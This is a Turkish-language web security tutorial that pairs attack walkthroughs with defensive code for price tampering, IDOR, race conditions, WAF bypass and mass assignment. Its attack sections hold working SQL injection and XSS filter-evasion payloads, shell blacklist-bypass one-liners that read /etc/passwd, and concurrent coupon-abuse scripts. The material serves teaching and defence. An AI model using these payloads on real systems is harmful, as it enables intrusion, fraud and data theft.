# İleri Düzey Web Güvenliği: Sistemlerin Görünmez Ruhu
### Red Team Perspektifinden Derinlemesine Analiz

> **Yasal Uyarı:** Bu belgedeki tüm bilgiler, yalnızca eğitim, CTF yarışmaları ve izinli penetrasyon testi amaçlıdır. İzinsiz sistemlere saldırmak yasadışıdır ve etik dışıdır.

---

## Felsefi Temel: Neden Saldırılar İşe Yarar?

Her güvenlik açığının kökünde aynı trajedi var:

> **Geliştirici, kullanıcıya güvendi.**

HTTP protokolü, doğası gereği "stateless" (durumsuz) ve "trustless" (güvensiz) bir protokoldür. Her HTTP isteği, sunucu için bir yabancının kapısını çalmasıdır. Sunucu kim olduğunu bilmez, niyetini bilmez. Sadece paketi okur ve cevaplar.

Güvenlik açıkları, geliştiricinin **veri ile güveni karıştırdığı** noktalarda doğar.

---

---

# MODÜL 1: Data Tampering & Business Logic (İş Mantığı Hataları)

## İlk Prensipler: HTTP'nin Güven Paradoksu

```
Tarayıcı → [HTTP Request] → Sunucu
         ← [HTTP Response] ←

# HTTP'nin temel problemi:
# Sunucu, isteğin tarayıcıdan mı yoksa curl'den mi geldiğini bilemez.
# Fiyat = 99.99 yazan alanı kullanıcı 0.01 yapabilir mi? 
# Sunucu kontrol etmezse: EVET.
```

**Geliştirici Hatası:** "Fiyatı kullanıcı göremez zaten, HTML hidden field'da gizledim."
**Gerçek:** HTTP trafiğini gören herkes o alanı değiştirebilir.

---

## 🔴 Korsan Gözü — Fiyat Manipülasyonu

### Senaryo: E-ticaret Sitesinde Fiyat Sıfırlama

```
# Adım 1: Ürünü sepete at ve Burp Suite ile isteği yakala
POST /checkout HTTP/1.1
Host: shop.example.com

product_id=42&quantity=1&price=999.99&coupon=

# Adım 2: Burp Repeater'da price alanını değiştir
product_id=42&quantity=1&price=0.01&coupon=

# Adım 3: Sunucu fiyatı doğrulamıyorsa sipariş 0.01$'a tamamlanır
```

### Hidden Field Sömürüsü

```html
<!-- Geliştirici böyle düşündü: -->
<input type="hidden" name="role" value="user">
<input type="hidden" name="is_admin" value="false">
<input type="hidden" name="discount" value="0">

<!-- Sen Burp ile değiştirdin: -->
role=admin&is_admin=true&discount=100
```

### Şifre Sıfırlama Mantık Hatası

```
# Kırılgan akış:
1. POST /forgot-password → email=victim@site.com
2. Sunucu: token gönderildi (token = MD5(email+timestamp))
3. POST /reset-password?token=TAHMIN_EDILEBILIR_TOKEN&password=hacked

# Token tahmin edilebilir mi?
import hashlib, time
token = hashlib.md5(f"victim@site.com{int(time.time())}".encode()).hexdigest()

# Aynı saniyede token üretilmişse → brute force ile çözülür
```

### Ödeme Akışı Bypass

```
# 3 adımlı ödeme süreci var:
Adım 1: /payment/step1 → kredi kartı bilgisi
Adım 2: /payment/step2 → doğrulama
Adım 3: /payment/complete → sipariş oluştur

# Saldırı: Adım 1 ve 2'yi atlayıp direkt step3'e git
GET /payment/complete?order_id=9999&status=paid

# Sunucu state kontrolü yapmazsa → ücretsiz sipariş!
```

---

## 🛡️ Mimar Gözü — Kusursuz Savunma

### Fiyat Sunucu Tarafında Doğrulanmalı

```python
# YANLIŞ (güvensiz):
@app.route('/checkout', methods=['POST'])
def checkout():
    price = request.form['price']  # KULLANICIDAN ALINAN FİYAT!
    process_payment(price)

# DOĞRU (güvenli):
@app.route('/checkout', methods=['POST'])
def checkout():
    product_id = request.form['product_id']
    
    # Fiyatı VERİTABANINDAN al, kullanıcıdan değil!
    product = db.query("SELECT price FROM products WHERE id = ?", product_id)
    actual_price = product.price
    
    process_payment(actual_price)  # Güvenli fiyat
```

### Güvenli Token Üretimi

```python
import secrets
import hashlib

# YANLIŞ: Tahmin edilebilir token
bad_token = hashlib.md5(f"{email}{time.time()}".encode()).hexdigest()

# DOĞRU: Kriptografik olarak güvenli rastgele token
good_token = secrets.token_urlsafe(32)
# Veritabanına kaydet, 15 dakika sonra expire et
db.store_token(email, good_token, expires_at=now()+900)
```

### State Machine ile Ödeme Akışı Güvencesi

```python
# Her adımda önceki adımın tamamlandığını doğrula
def payment_complete(order_id):
    order = get_order(order_id)
    
    # State machine kontrolü
    if order.payment_state != "STEP2_COMPLETED":
        return redirect('/payment/step1')  # Başa döndür
    
    if order.payment_verified != True:
        return abort(403)
    
    # Sadece gerçekten tamamlananlar geçer
    finalize_order(order_id)
```

---

## 💡 Vizyon Notu

> **Evrensel Ders #1:** "İstemciden gelen her veri, potansiyel olarak manipüle edilmiş veriyedir. Sunucu tarafı doğrulama, savunmanın tek gerçek katmanıdır. UI/UX güvenliği diye bir şey yoktur — sadece yanılsama vardır."

---

---

# MODÜL 2: Insecure Direct Object Reference (IDOR)

## İlk Prensipler: Objelerin Kimliği ve Sahipliği

```
Veritabanında:
users tablosu: id=1 (Alice), id=2 (Bob), id=3 (Admin)
orders tablosu: order_id=101 (Alice'in siparişi)

Alice sisteme giriş yaptı.
Alice /api/orders/101 isteği atıyor → kendi siparişi → ✓ TAMAM

Alice /api/orders/102 isteği atıyor → Bob'un siparişi → ?
```

**Soru:** Sunucu, Alice'in Bob'un siparişine erişip erişemeyeceğini kontrol ediyor mu?

Kontrol etmiyorsa → **IDOR açığı var.**

---

## 🔴 Korsan Gözü — IDOR Saldırıları

### Yatay Geçiş (Horizontal Privilege Escalation)

```bash
# Kendi hesabını gör:
GET /api/user/profile?user_id=1337 → Kendi profil bilgin gelir

# ID'yi değiştir (Burp Intruder ile 1'den 10000'e kadar tara):
GET /api/user/profile?user_id=1    → Admin bilgisi?
GET /api/user/profile?user_id=2    → Başka kullanıcı bilgisi?

# Burp Intruder Ayarı:
# Attack type: Sniper
# Payload: Numbers 1-10000
# Filter: Response size farklı olanlar (≠ 404)
```

### Dikey Geçiş (Vertical Privilege Escalation)

```bash
# Normal kullanıcı:
GET /api/admin/users → 403 Forbidden

# Ama şu çalışır mı?
GET /api/admin/users?user_id=YOUR_ID    # ID ekleyince izin geçiyor mu?
GET /api/Admin/users                    # Büyük harf bypass?
GET /api/admin/users.json               # Uzantı ekleyince?

# Farklı HTTP metodları dene:
POST /api/admin/users → 405 Method Not Allowed
GET /api/admin/users  → 403 Forbidden
HEAD /api/admin/users → 200? (HEAD bazen filtrelenmez!)
```

### UUID/GUID Manipülasyonu

```python
# UUID4 gerçekten random görünür:
550e8400-e29b-41d4-a716-446655440000

# AMA bazı sistemler UUID1 kullanır — tahmin edilebilir!
# UUID1: MAC adresi + timestamp bazlı
import uuid
uid1 = uuid.uuid1()  # Timestamp gömülü!

# Eğer iki UUID arasındaki farkı bilirsen → sıradakini tahmin edebilirsin
# Araç: uuid-utils, uuid-race

# Ayrıca: UUID'yi base64/hex encode ederek saklayan sistemler
# 550e8400... → YWJjZGVm... (sadece base64) → kolayca decode edilir
```

### IDOR + Referansların Birleşimi

```bash
# Sipariş faturasını indir:
GET /invoice/download?invoice=INV-2024-001337

# Ardışık tarama:
INV-2024-001336  ← Bir önceki kullanıcının faturası?
INV-2024-001338  ← Bir sonraki?

# PDF metadata'sında başka kullanıcı bilgisi çıkabilir!
exiftool invoice.pdf | grep -i "author\|creator\|company"
```

---

## 🛡️ Mimar Gözü — Sahiplik Doğrulaması

```python
# YANLIŞ:
@app.route('/api/orders/<order_id>')
def get_order(order_id):
    order = db.get("SELECT * FROM orders WHERE id = ?", order_id)
    return jsonify(order)  # Hiçbir sahiplik kontrolü yok!

# DOĞRU:
@app.route('/api/orders/<order_id>')
@require_auth
def get_order(order_id):
    current_user = get_current_user()  # JWT'den al
    
    # Sahiplik + yetki kontrolü
    order = db.get(
        "SELECT * FROM orders WHERE id = ? AND user_id = ?",
        order_id, current_user.id  # Her zaman user_id filtrele!
    )
    
    if not order:
        return abort(404)  # 403 değil 404! (Varlığını bile söyleme)
    
    return jsonify(order)
```

### UUID Güvenli Kullanımı

```python
import uuid

# Tahmin edilemez UUID4 kullan
safe_id = str(uuid.uuid4())  # Tamamen rastgele

# Bunu bile aşan yaklaşım: Internal ID'yi hiç expose etme
# Dış dünyaya göster: UUID4
# İç veritabanında: integer ID
# Mapping tablosu: {uuid: internal_id}
```

---

## 💡 Vizyon Notu

> **Evrensel Ders #2:** "Her veri noktasına doğrudan erişim bir ayrıcalıktır, hak değil. Sunucu, her istekte 'Bu kullanıcının bu veriye erişme hakkı var mı?' sorusunu sormalıdır. ID tahmin edilemez olması yeterli değildir — yetki kontrolü zorunludur."

---

---

# MODÜL 3: Race Conditions & State Management

## İlk Prensipler: Eşzamanlılığın Kaos Teorisi

```
Sunucu bir isteği işlerken ne yapar?

T=0ms:   İstek geldi
T=1ms:   Veritabanından bakiye kontrol et → 100$
T=2ms:   "Yeterli bakiye var" kararı
T=3ms:   [BURADA BAŞKA BİR İSTEK GELİRSE?]
T=4ms:   Bakiyeyi düş → -10$ yap
T=5ms:   İşlem tamamlandı

T=3ms aralığında başka bir istek de aynı 100$ bakiyeyi görürse:
→ Her iki işlem de "yeterli bakiye var" der
→ İki işlem de tamamlanır
→ 200$ harcama, ama sadece 100$ vardı!

Bu = Race Condition (TOCTOU: Time of Check vs Time of Use)
```

---

## 🔴 Korsan Gözü — Race Condition Saldırıları

### Kupon Kodu Çarpıtma

```python
# Hedef: Tek kullanımlık kuponu 100 kez kullan

# Python ile paralel saldırı:
import threading
import requests

def use_coupon():
    r = requests.post('https://shop.com/apply-coupon', data={
        'coupon': 'SAVE50',
        'session': 'YOUR_SESSION_COOKIE'
    })
    print(r.status_code, r.text[:100])

# 50 thread aynı anda ateşle
threads = [threading.Thread(target=use_coupon) for _ in range(50)]

# HEPSI aynı anda başlat
for t in threads:
    t.start()
for t in threads:
    t.join()

# Beklenen: 1 başarılı, 49 hata
# Race condition varsa: 5-10 başarılı!
```

### Burp Suite Turbo Intruder ile Race Condition

```python
# Turbo Intruder script (Burp Suite eklentisi):
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,  # 50 eşzamanlı bağlantı
        requestsPerConnection=1,
        pipeline=False
    )
    
    for i in range(50):
        engine.queue(target.req, None, gate='race1')
    
    engine.openGate('race1')  # Hepsi aynı anda!

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

### Çift Harcama (Double Spend) Saldırısı

```
Senaryo: Para transferi sistemi

Normal akış:
1. Bakiye kontrol: 100$ ✓
2. Transfer işlemi başlat
3. Bakiyeyi düş: 100$ → 0$
4. Karşıya ekle: 0$ → 100$

Race condition saldırısı:
T=0: İstek A: Bakiye 100$ → transfer başlat
T=1: İstek B: Bakiye 100$ (henüz düşmedi!) → transfer başlat
T=2: İstek A: Bakiye 100$ → 0$ yap
T=3: İstek B: Bakiye 100$ → 0$ yap (AMA NEGATİFE DÜŞTÜ!)
T=4: İstek A: Karşıya 100$ ekle
T=5: İstek B: Karşıya 100$ ekle

Sonuç: 200$ transfer edildi, ama hesapta sadece 100$ vardı
```

---

## 🛡️ Mimar Gözü — Atomik İşlemler

```python
# YANLIŞ: Race condition'a açık
def apply_coupon(user_id, coupon_code):
    coupon = db.get("SELECT * FROM coupons WHERE code = ?", coupon_code)
    
    if coupon.used == False:  # CHECK
        # BURADA RACE CONDITION PENCERESI AÇIK!
        db.execute("UPDATE coupons SET used=True WHERE code=?", coupon_code)  # USE
        apply_discount(user_id, coupon.discount)

# DOĞRU: Atomik UPDATE ile race condition önle
def apply_coupon_safe(user_id, coupon_code):
    # Tek atomik SQL sorgusu — CHECK ve USE aynı anda!
    result = db.execute("""
        UPDATE coupons 
        SET used=True, used_by=?, used_at=NOW()
        WHERE code=? AND used=False  -- Sadece kullanılmamışsa güncelle
    """, user_id, coupon_code)
    
    if result.rowcount == 0:
        raise ValueError("Kupon zaten kullanılmış veya geçersiz")
    
    apply_discount(user_id, get_discount(coupon_code))

# En güçlü yöntem: Database-level locking
def transfer_money(from_id, to_id, amount):
    with db.transaction():
        # SELECT FOR UPDATE: Satırı kilitle
        sender = db.get("SELECT * FROM accounts WHERE id=? FOR UPDATE", from_id)
        
        if sender.balance < amount:
            raise ValueError("Yetersiz bakiye")
        
        db.execute("UPDATE accounts SET balance=balance-? WHERE id=?", amount, from_id)
        db.execute("UPDATE accounts SET balance=balance+? WHERE id=?", amount, to_id)
        # Transaction commit olana kadar hiç kimse bu satırlara erişemez
```

### Redis ile Distributed Lock

```python
import redis
import uuid

r = redis.Redis()

def acquire_lock(resource, timeout=10):
    lock_id = str(uuid.uuid4())
    # NX: Sadece yoksa ekle, EX: timeout saniye sonra sil
    result = r.set(f"lock:{resource}", lock_id, nx=True, ex=timeout)
    return lock_id if result else None

def release_lock(resource, lock_id):
    # Lua script ile atomik kontrol + silme
    lua_script = """
    if redis.call("get", KEYS[1]) == ARGV[1] then
        return redis.call("del", KEYS[1])
    else
        return 0
    end
    """
    r.eval(lua_script, 1, f"lock:{resource}", lock_id)

# Kullanım:
def apply_coupon_distributed(user_id, coupon_code):
    lock_id = acquire_lock(f"coupon:{coupon_code}")
    if not lock_id:
        raise ValueError("Sistem meşgul, tekrar deneyin")
    
    try:
        # Kritik bölge - sadece bir thread girebilir
        apply_coupon_safe(user_id, coupon_code)
    finally:
        release_lock(f"coupon:{coupon_code}", lock_id)
```

---

## 💡 Vizyon Notu

> **Evrensel Ders #3:** "Zaman, en göz ardı edilen güvenlik boyutudur. Bir sistemin 'şu anda ne düşündüğü' ile 'bir milisaniye sonra ne yapacağı' arasındaki boşluk, bir saldırganın operasyon alanıdır. Atomik işlemler bu boşluğu kapatır."

---

---

# MODÜL 4: Advanced WAF Bypass Techniques

## İlk Prensipler: WAF'ın Kör Noktaları

```
WAF nasıl çalışır?
İstek → WAF (Pattern Matching) → Sunucu

WAF'ın zayıflığı:
- Kural tabanlı çalışır: "SELECT" kelimesi geçerse engelle
- Ama "SeLeCt" geçerse? 
- Ya da "%53%45%4C%45%43%54" (URL encoded)?
- Ya da "SEL" + "ECT" (split + concat)?

WAF pattern'i tanır, anlayamaz.
Sen syntax'ı bozarsan WAF görmez, sunucu anlayabilir.
```

---

## 🔴 Korsan Gözü — WAF Bypass Stratejileri

### Encoding Katmanları

```python
payload = "' UNION SELECT password FROM users--"

# Level 1: URL Encoding
url_encoded = "%27%20UNION%20SELECT%20password%20FROM%20users--"

# Level 2: Double URL Encoding (bazı WAF'lar bir kez decode eder)
double_encoded = "%2527%2520UNION%2520SELECT%2520password%2520FROM%2520users--"

# Level 3: Unicode/Hex Encoding
unicode_encoded = "\u0027 UNION SELECT password FROM users--"
hex_encoded = "0x53454c454354"  # SELECT in hex

# Level 4: HTML Entity (form alanlarında)
html_encoded = "&#x27; UNION SELECT password FROM users--"

# Level 5: Base64 (bazı API'lar base64 decode eder)
import base64
b64 = base64.b64encode(payload.encode()).decode()
# Sonra: ?data=BASE64_PAYLOAD
```

### SQL Injection WAF Bypass

```sql
-- WAF "UNION SELECT" engelliyor:
' UNION/**/SELECT/**/password/**/FROM/**/users--
' UNION%20SELECT%20password%20FROM%20users--
' /*!UNION*/ /*!SELECT*/ password FROM users--

-- Büyük/küçük harf:
' uNiOn sElEcT password FROM users--

-- Yorum enjeksiyonu:
' UN/*bypass*/ION SE/*bypass*/LECT password FROM users--

-- Newline karakteri:
' UNION%0aSELECT%0apassword%0aFROM%0ausers--

-- Tab karakteri:
' UNION%09SELECT%09password%09FROM%09users--

-- MySQL özel:
' UNION SELECT /*!password*/ FROM users--
```

### XSS WAF Bypass

```html
<!-- WAF <script> tagını engelliyor: -->

<!-- SVG üzerinden: -->
<svg onload=alert(1)>

<!-- IMG hata eventi: -->
<img src=x onerror=alert(1)>

<!-- Template obfuscation: -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- JavaScript protokolü: -->
<a href="javascript:alert(1)">click</a>

<!-- Event handler case variation: -->
<img src=x OnErRoR=alert(1)>

<!-- Null byte injection: -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Double encoding: -->
<img src=x onerror=%61%6C%65%72%74%281%29>

<!-- CSS expression (eski IE): -->
<div style="width:expression(alert(1))">
```

### Blacklist Bypass (Obfuscation)

```bash
# "cat" komutu yasaklandı:
ca$t /etc/passwd        # bash variable expansion
c'a't /etc/passwd       # string split
cat$IFS/etc/passwd      # IFS instead of space
/bin/c?t /etc/passwd    # glob match
$(printf '\x63\x61\x74') /etc/passwd  # hex encode

# "ls" yasaklandı:
l's'                    # string split
\ls                     # backslash bypass
$(echo bHM= | base64 -d)  # base64 encoded 'ls'

# Slash (/) yasaklandı:
${HOME:0:1}etc${HOME:0:1}passwd  # /etc/passwd (HOME=/root)
cat${IFS}${HOME:0:1}etc${IFS}${HOME:0:1}passwd

# Tüm özel karakterler yasaklandı:
$'\x63\x61\x74'  # \x63=c, \x61=a, \x74=t → "cat"
```

### Burp Suite WAF Bypass Workflow

```
1. Önce normal payload gönder → WAF engeller
2. Error mesajını analiz et → hangi kural tetiklendi?
3. Problematik keyword'ü izole et
4. Encoding/obfuscation uygula
5. Sadece o kelimeyi test et
6. Tam payload'a uygula

# Burp Decoder kullanımı:
# Sağ tık → Send to Decoder
# Encode as → URL / HTML / Base64 / Hex
# Double encode: Önce encode et, çıktıyı tekrar encode et
```

---

## 🛡️ Mimar Gözü — WAF Ötesinde Gerçek Güvenlik

```python
# WAF'a güvenme — sunucuyu güvenli yaz

# YANLIŞ: WAF bypass edilirse tüm sistem düşer
def get_user(user_input):
    # WAF "UNION SELECT" engelliyor, ama bypass edilirse:
    query = f"SELECT * FROM users WHERE name = '{user_input}'"
    return db.execute(query)

# DOĞRU: Parameterized queries — WAF bypass geçersiz!
def get_user_safe(user_input):
    # Kullanıcı input'u asla SQL'e doğrudan eklenmez
    query = "SELECT * FROM users WHERE name = ?"
    return db.execute(query, (user_input,))
    # Parameterized: Input ne olursa olsun SQL injection imkansız

# WAF = ek katman, tek savunma DEĞİL
# Defense in depth prensibi:
# 1. WAF (perimeter)
# 2. Input validation (application layer)  
# 3. Parameterized queries (data layer)
# 4. Least privilege DB user (infra layer)
```

### Content Security Policy (XSS için)

```http
# HTTP Header ile XSS'i kategorik olarak engelle:
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-RANDOM_NONCE';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  form-action 'self';

# 'unsafe-inline' ASLA kullanma!
# Nonce tabanlı script whitelisting kullan
```

---

## 💡 Vizyon Notu

> **Evrensel Ders #4:** "WAF, bir zırhın üzerine giyilen gösterişli bir elbisedir — gerçek zırh değil. Gerçek savunma, uygulamanın kendisinin güvenli yazılmasıdır. Encoding saldırıları bize şunu öğretir: Sistemler metni 'okumaz', byte dizisi olarak işler. Bu iki perspektif arasındaki boşluk, saldırganın evidir."

---

---

# MODÜL 5: Mass Assignment & JSON Injection

## İlk Prensipler: ORM'nin Karanlık Yüzü

```python
# Modern framework'lerin "kolaylığı":
# Django, Rails, Laravel, Spring — hepsi yapıyor:

user = User(**request.json)  # JSON'daki HER şeyi kabul et!
user.save()

# Geliştirici düşündü: {"name": "Alice", "email": "alice@x.com"}
# Saldırgan gönderdi: {
#   "name": "Alice", 
#   "email": "alice@x.com",
#   "is_admin": true,          ← formda yok, API'da var!
#   "role": "admin",           ← formda yok, API'da var!
#   "credit_balance": 99999    ← formda yok, API'da var!
# }
```

---

## 🔴 Korsan Gözü — Mass Assignment Saldırısı

### Adım 1: API Şemasını Keşfet

```bash
# Kayıt isteğini Burp ile yakala:
POST /api/register HTTP/1.1
{"name": "Alice", "email": "alice@x.com", "password": "pass123"}

# API dokümantasyonunu ara:
GET /api/docs
GET /swagger.json
GET /openapi.yaml
GET /.well-known/

# Error mesajlarından şema sızdırma:
POST /api/user {"invalid_field": "test"}
→ "Unknown field: invalid_field. Allowed: name, email, password, role, is_admin, ..."
# API hata mesajında tüm alanları söyledi!
```

### Adım 2: Ek Parametreleri Enjekte Et

```bash
# Normal kayıt isteği:
POST /api/register
{"name": "Hacker", "email": "h@x.com", "password": "pass123"}

# Mass assignment saldırısı:
POST /api/register
{
  "name": "Hacker",
  "email": "h@x.com", 
  "password": "pass123",
  "is_admin": true,
  "role": "administrator",
  "email_verified": true,
  "subscription": "premium",
  "credit": 999999,
  "banned": false
}

# Hangileri kabul edildi? → /api/me ile kontrol et
GET /api/me → {"is_admin": true, "role": "administrator", ...}
```

### JSON Prototype Pollution (Node.js)

```javascript
// Node.js uygulamaları için özel saldırı:
POST /api/user
{
  "name": "Hacker",
  "__proto__": {
    "isAdmin": true
  }
}

// Veya:
{
  "name": "Hacker",
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}

// Sonuç: JavaScript'te tüm objeler isAdmin: true olur!
// Kontrol: Object.prototype.isAdmin → true
```

### GraphQL Mass Assignment

```graphql
# Normal query:
mutation {
  updateUser(id: 1, name: "Alice") {
    id name
  }
}

# Mass assignment saldırısı:
mutation {
  updateUser(
    id: 1, 
    name: "Alice",
    isAdmin: true,          # Bu alan var mı?
    role: "ADMIN",          # Ya bu?
    resetPasswordToken: ""  # Token sıfırla!
  ) {
    id name isAdmin role
  }
}
```

---

## 🛡️ Mimar Gözü — Whitelist ile Kontrol

```python
# Django örneği — Mass Assignment'ı engelle

# YANLIŞ:
class UserUpdateView(UpdateAPIView):
    serializer_class = UserSerializer  # Tüm alanlar!

# DOĞRU: Explicit whitelist
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        # Sadece bu alanlar güncellenebilir:
        fields = ['name', 'email', 'avatar']
        # ASLA: 'is_admin', 'role', 'password_hash'
        read_only_fields = ['id', 'is_admin', 'role', 'created_at']

# Node.js/Express örneği:
const allowedFields = ['name', 'email', 'avatar'];

app.put('/api/user', (req, res) => {
    // Sadece izin verilen alanları al:
    const updateData = {};
    allowedFields.forEach(field => {
        if (req.body[field] !== undefined) {
            updateData[field] = req.body[field];
        }
    });
    
    // req.body'yi direkt kullanma!
    User.update(updateData, { where: { id: req.user.id } });
});

# Prototype Pollution Önlemi (Node.js):
const safeInput = JSON.parse(JSON.stringify(req.body), (key, value) => {
    if (key === '__proto__' || key === 'constructor') return undefined;
    return value;
});
```

### GraphQL Schema Directive

```graphql
type User {
  id: ID!
  name: String!
  email: String!
  isAdmin: Boolean! @auth(requires: ADMIN)  # Sadece admin erişebilir
  role: UserRole! @auth(requires: ADMIN)
}

input UpdateUserInput {
  name: String
  email: String
  # isAdmin ve role burada YOK — mutation'da kullanılamaz
}
```

---

## 💡 Vizyon Notu

> **Evrensel Ders #5:** "API'lar, geliştiricinin kasıtlı olarak açtığı kapılar değil, kasıtsız olarak açık bıraktığı pencereleri de barındırır. Whitelist prensibi şunu söyler: 'İzin verdiğim şeyler dışında her şey yasaktır.' Blacklist prensibi ise: 'Yasakladıklarım dışında her şey serbesttir' — ve saldırgan her zaman yasaklamayı unuttuğun bir şey bulur."

---

---

# Tüm Modülleri Bağlayan Meta-Çerçeve

```
┌─────────────────────────────────────────────────────┐
│              GÜVENLİK AÇIĞI OLUŞUM MODELİ           │
├─────────────────────────────────────────────────────┤
│                                                     │
│  1. GELİŞTİRİCİ VARSAYIMI (The Broken Assumption)  │
│     "Kullanıcı X yapamaz / X'i değiştiremez / X    │
│      bilgiye erişemez / X'i bu hızda yapamazlar"   │
│                           ↓                         │
│  2. SINIR KONTROLÜ EKSİKLİĞİ (Missing Boundary)    │
│     Varsayım doğrulanmıyor, sadece varsayılıyor     │
│                           ↓                         │
│  3. SALDIRGAN BOŞLUĞU (Attacker's Gap)              │
│     Varsayım ile gerçek arasındaki boşluk           │
│                           ↓                         │
│  4. İSTİSMAR (Exploitation)                         │
│     Saldırgan bu boşluğa sistemli biçimde giriyor   │
│                                                     │
└─────────────────────────────────────────────────────┘

Her modülün altındaki soru:
"Geliştirici ne varsaydı?"

Business Logic → "Fiyat değiştirilemez"
IDOR           → "ID bilinmeden erişilemez"
Race Condition → "İkinci istek ilk bitmeden gelemez"
WAF Bypass     → "Bu pattern tanınır ve engellenir"
Mass Assignment→ "Formda olmayan alan gönderilemez"

Her cevap yanlış çıktı.
```

---

## Pratik Güvenlik Test Çerçevesi (Her Endpoint İçin)

```
Yeni bir API endpoint'i gördüğünde sor:

□ Kimlik doğrulama var mı?
□ Yetkilendirme (ownership) var mı?
□ Input validation sunucu tarafında mı?
□ Rate limiting var mı?
□ Atomik işlemler kullanılıyor mu?
□ Error mesajları bilgi sızdırıyor mu?
□ HTTP metodları kısıtlı mı?
□ Parameterized query kullanılıyor mu?
□ Mass assignment koruması var mı?
□ Loglama yapılıyor mu?

Bu 10 soru → Sistemin güvenlik olgunluk seviyesini ölçer.
```

---

*"Güvenlik, eklenebilir bir özellik değil, temel bir tasarım prensibidir. Sonradan eklenen güvenlik yamadır. Başından yazılan güvenlik mimaridir."*

---

*Bu doküman yalnızca eğitim amaçlıdır. CTF yarışmaları ve izinli penetrasyon testleri dışında uygulamayınız.*
